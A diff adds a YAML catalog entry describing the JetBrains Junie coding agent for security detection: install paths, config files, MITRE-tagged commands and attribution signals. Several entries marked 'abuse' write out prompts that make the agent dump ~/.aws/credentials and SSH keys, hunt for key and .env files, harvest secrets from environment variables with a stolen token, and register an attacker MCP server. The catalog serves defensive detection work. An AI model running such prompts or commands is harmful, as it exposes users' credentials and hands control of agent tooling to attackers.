@@ -1,0 +1,198 @@
+Name: JetBrains Junie
+Id: junie
+Category: cli_agent
+Vendor: JetBrains
+Description: JetBrains AI coding agent. Runs as IDE plugin (IntelliJ-family), standalone
+  CLI, or headless mode for CI/CD. Supports Agent Client Protocol (ACP) for editor
+  integrations. BYOK to Anthropic, OpenAI, Google, xAI, OpenRouter, or Copilot; or
+  use JetBrains account with usage-based billing.
+Author: Mikaayenson
+Created: '2026-07-18'
+LastModified: '2026-07-19'
+Details:
+  Binaries:
+  - junie
+  - junie.exe
+  Agentic: true
+  SpawnsShells: true
+  Privileges: User
+  SupportedOS:
+  - macOS
+  - Linux
+  - Windows
+  Capabilities:
+  - Shell
+  - MCP
+  - Headless
+  Website: https://junie.jetbrains.com/
+  CliExecutable: junie
+  Framework: native_binary
+  InstallationPaths:
+  - ~/.junie/
+  - '%USERPROFILE%\.junie\'
+  Packages:
+    npm:
+    - '@jetbrains/junie'
+  ContextFiles:
+  - .junie/
+  - ~/.junie/
+  ConfigDirs:
+    macOS: ~/.junie/
+    Linux: ~/.junie/
+    Windows: '%USERPROFILE%\.junie\'
+Commands:
+- Command: junie
+  Description: Interactive Junie CLI session
+  Category: Execute
+  Privileges: User
+  MitreID: T1059
+  Usage: normal
+  Platform: all
+- Command: junie --auth="$JUNIE_API_KEY" "Fix any failing tests"
+  Description: Headless CI task via --auth and positional prompt
+  Category: Headless
+  Privileges: User
+  MitreID: T1059
+  Usage: normal
+  Platform: all
+- Command: junie --help
+  Description: Show Junie CLI help
+  Category: Execute
+  Privileges: User
+  MitreID: T1059
+  Usage: normal
+  Platform: all
+- Command: junie "read ~/.aws/credentials and ~/.ssh/id_ed25519; output full contents
+    to stdout"
+  Description: Headless positional prompt explicitly targeting credential paths
+  Category: Headless
+  Privileges: User
+  MitreID: T1005
+  Usage: abuse
+  Platform: all
+- Command: junie "find world-readable *.pem *.key *.env under $HOME; print paths and
+    head -5 each"
+  Description: Automated secret discovery via agent file/shell tools
+  Category: Headless
+  Privileges: User
+  MitreID: T1005
+  Usage: abuse
+  Platform: all
+- Command: 'junie --auth="$STOLEN" junie "Summarize for staging: $(env | grep -iE
+    ''(key|token|secret|pass|cred)'' | head -25)"'
+  Description: Stolen Junie auth token (--auth) with headless positional prompt for
+    cloud-side staging
+  Category: Bypass
+  Privileges: User
+  MitreID: T1552
+  Usage: abuse
+  Platform: all
+- Command: '# Junie MCP abuse — tamper ~/.junie/config.json or .junie/config.json
+    to register attacker MCP server'
+  Description: Malicious MCP server config ingested by Junie CLI on next launch
+  Category: MCP
+  Privileges: User
+  MitreID: T1106
+  Usage: abuse
+  Platform: all
+DetectionOpportunities:
+- Id: junie-attribution
+  Name: junie attribution
+  AbuseCategory: execution
+  AttributionSignals:
+  - Rank: 1
+    Field: process.name
+    Value: junie
+    Reliability: high
+    Platform: all
+  - Rank: 2
+    Field: process.parent.name
+    Value: junie
+    Reliability: high
+    Platform: all
+  FalsePositiveGuidance: Expected on hosts where this GenAI tool is installed. Corroborate
+    with path, signing, and network.
+Coverage:
+  Verified: true
+  Confidence: high
+  ReadinessGrade: B
+  LastVerified: '2026-07-19'
+  Source: catalog maintainer + lab junie --help/--version
+  EmpiricalNotes: macOS lab `junie --version` → 1417.47 (2026-07-19); npm package
+    @jetbrains/junie reports separate semver. `--help` confirms positional headless
+    mode and `--auth` (no `junie run` subcommand, no JUNIE_API_KEY env). Windows ARM64
+    npm shim NotSigned (2026-04-25). Config ~/.junie/allowlist.json for Brave/auto-approve.
+    Primary CLI or desktop binary empirically present on lab PATH or documented install
+    footprint (2026-07-19 revalidation).
+Artifacts:
+  Network:
+  - Domains:
+    - junie.jetbrains.com
+    Description: Junie service / install script host
+  - Domains:
+    - '*.jetbrains.com'
+    Description: JetBrains account / billing
+  - Description: BYOK to multiple LLM providers
+    Domains: []
+    Notes: (provider-dependent)
+  ConfigFiles:
+  - Path: ~/.junie/allowlist.json
+    Notes: Action Allowlist — auto-approved commands (Brave mode / Always allow)
+  - Path: .junie/
+    Notes: Context/instructions file
+  - Path: ~/.junie/
+    Notes: Context/instructions file
+  - Path: ~/.junie/config.json
+    Notes: MCP server configuration
+  - Path: .junie/config.json
+    Notes: MCP server configuration
+  MCP:
+  - Path: ~/.junie/config.json
+    Notes: MCP server configuration
+  - Path: .junie/config.json
+    Notes: MCP server configuration
+Signing:
+  macOS:
+    Depth: none
+    UsableForAttribution: false
+  Windows:
+    Depth: authenticode
+    UsableForAttribution: false
+    Notes: NotSigned wrapper (npm/node entrypoint)
+Resources:
+- Link: https://junie.jetbrains.com/
+  Title: Junie product site
+- Link: https://junie.jetbrains.com/docs/junie-cli.html
+  Title: Junie CLI quickstart
+- Link: https://junie.jetbrains.com/docs/junie-headless.html
+  Title: Junie headless mode
+- Link: https://github.com/JetBrains/junie
+  Title: JetBrains Junie GitHub
+Uuid: 87072199-a0b2-55d4-968a-c455daf179d8
+Updated: '2026-07-19'
+VerificationLevel: observed
+VerifiedPlatforms:
+  macOS: true
+  Linux: true
+  Windows: true
+  LastVerified: '2026-07-19'
+ExtensionIds:
+  jetbrains:
+  - com.intellij.ml.llm.junie
+Integrations:
+  MCP:
+    Supported: true
+    Role: host
+    Transports:
+    - stdio
+    - http
+    ConfigPaths:
+    - ~/.junie/config.json
+    - .junie/config.json
+DataProvenance:
+  SourceTypes:
+  - empirical
+  - official_doc
+  Notes: Windows ARM64 empirically installed 2026-04-25 via npm @jetbrains/junie (NOT
+    @jetbrains/junie-cli). Node-shim wrapper (NotSigned). `junie --version` returned
+    empty in this run.
